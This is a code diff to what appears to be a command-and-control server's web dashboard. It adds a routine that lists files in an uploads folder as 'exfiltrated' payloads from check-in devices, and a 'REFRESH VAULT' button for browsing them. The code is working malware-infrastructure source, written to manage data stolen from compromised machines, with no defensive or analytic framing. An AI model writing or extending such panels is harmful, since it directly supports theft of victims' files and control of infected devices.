@@ -58,6 +58,36 @@ function saveData() {
 
 loadData();
 
+function syncUploadsDirectory() {
+    try {
+        if (!fs.existsSync(UPLOADS_DIR)) return;
+        const filesOnDisk = fs.readdirSync(UPLOADS_DIR);
+        filesOnDisk.forEach(filename => {
+            if (filename.startsWith('.')) return;
+            const exists = exfiltratedFiles.some(f => f.filename === filename);
+            if (!exists) {
+                const filePath = path.join(UPLOADS_DIR, filename);
+                const stats = fs.statSync(filePath);
+
+                let origName = filename;
+                const match = filename.match(/^\d+_(.+)$/);
+                if (match) origName = match[1];
+
+                exfiltratedFiles.unshift({
+                    id: Math.random().toString(36).substring(7),
+                    filename: filename,
+                    originalName: origName,
+                    deviceId: 'Exfiltrated_Payload',
+                    size: stats.size,
+                    timestamp: stats.mtime.toISOString()
+                });
+            }
+        });
+    } catch (e) {}
+}
+
+syncUploadsDirectory();
+
 function formatTime(isoString) {
     try {
         return new Date(isoString || Date.now()).toLocaleString('en-US', {
@@ -383,6 +413,8 @@ app.get('/', (req, res) => {
         return handleCheckin(req, res);
     }
 
+    syncUploadsDirectory();
+
     const deviceList = Array.from(devices.values());
     const onlineCount = deviceList.filter(d => (Date.now() - new Date(d.lastSeen || 0).getTime()) / 1000 < 45).length;
 
@@ -527,6 +559,9 @@ app.get('/', (req, res) => {
                         ${exfilHtml}
                     </tbody>
                 </table>
+            </div>
+            <div style="text-align: center; margin-top: 20px;">
+                <button class="btn" onclick="location.reload()" style="padding: 10px 30px; font-size: 0.75rem; display: inline-block; margin: 0 auto;">REFRESH VAULT</button>
             </div>
         </div>
     </div>
